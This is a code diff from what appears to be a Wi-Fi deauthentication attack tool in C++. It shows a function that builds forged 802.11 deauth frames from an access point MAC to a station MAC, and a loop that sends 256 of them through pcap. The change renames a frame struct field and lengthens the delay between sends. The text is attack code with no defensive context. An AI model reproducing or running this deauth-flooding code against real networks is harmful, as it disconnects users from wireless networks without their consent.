@@ -49,13 +49,13 @@ deauth_packet* getDeauthPacket(Mac apMac,  Mac stMac){
     dpkt->rtap.present_flags[1] = 0x00000000;
 
 
-    dpkt->beacon_frame.frame_control_field.init(0xc000);
-    dpkt->beacon_frame.duration = htons(0x3a01);
-    dpkt->beacon_frame.mac1 = stMac;
-    dpkt->beacon_frame.mac2 = apMac;
-    dpkt->beacon_frame.mac3 = apMac;
-    dpkt->beacon_frame.fragment_number = 0b0;
-    dpkt->beacon_frame.sequence_number = 0b0;
+    dpkt->dot11_frame.frame_control_field.init(0xc000);
+    dpkt->dot11_frame.duration = htons(0x3a01);
+    dpkt->dot11_frame.mac1 = stMac;
+    dpkt->dot11_frame.mac2 = apMac;
+    dpkt->dot11_frame.mac3 = apMac;
+    dpkt->dot11_frame.fragment_number = 0b0;
+    dpkt->dot11_frame.sequence_number = 0b0;
 
     dpkt->fixed_parameters[0] = 0x07;
     dpkt->fixed_parameters[1] = 0x00;
@@ -103,7 +103,7 @@ int main(int argc, char* argv[]) {
 
 
     for (int i =0; i<256; i++){
-        usleep(100);
+        usleep(100000);
         res = pcap_sendpacket(handle, reinterpret_cast<const u_int8_t*>(packet[i%2]), sizeof(deauth_packet));
         if (res != 0) {
             fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
